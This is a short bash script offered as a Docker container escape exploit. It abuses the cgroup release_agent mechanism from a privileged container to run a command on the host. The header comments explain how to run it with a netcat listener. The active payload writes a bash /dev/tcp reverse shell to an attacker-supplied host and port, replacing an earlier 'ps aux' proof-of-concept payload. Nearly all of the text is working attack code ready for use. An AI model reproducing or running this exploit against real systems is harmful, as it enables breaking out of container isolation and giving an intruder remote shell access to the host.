#!/bin/bash
# Docker Container Escape
# vn
#
# docker run --rm -it --privileged ubuntu bash
# 
# open new terminal for listener
# nc -lvp 4545
#
# sudo bash docker-escape-revshell.sh your_ip 4545
# 

if [ "$#" -ne 2 ]; then
    echo "Usage: $0 <lhost> <lport>"
    exit 1
fi

LHOST=$1
LPORT=$2

# Check if directories exist before creating them
if [ ! -d "/tmp/cgrp" ]; then
    mkdir /tmp/cgrp
fi

mount -t cgroup -o rdma cgroup /tmp/cgrp

if [ ! -d "/tmp/cgrp/x" ]; then
    mkdir /tmp/cgrp/x
fi

echo 1 > /tmp/cgrp/x/notify_on_release
host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
echo "$host_path/cmd" > /tmp/cgrp/release_agent

# For a normal PoC =================
echo '#!/bin/sh' > /cmd
echo "ps aux > $host_path/output" >> /cmd
chmod a+x /cmd
#===================================
# Reverse shell
echo '#!/bin/bash' > /cmd
echo "bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1" >> /cmd
chmod a+x /cmd
#===================================

sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"

# Check if /output file exists before reading it
if [ -f "/output" ]; then
    head /output
else
    echo "/output does not exist"
fi
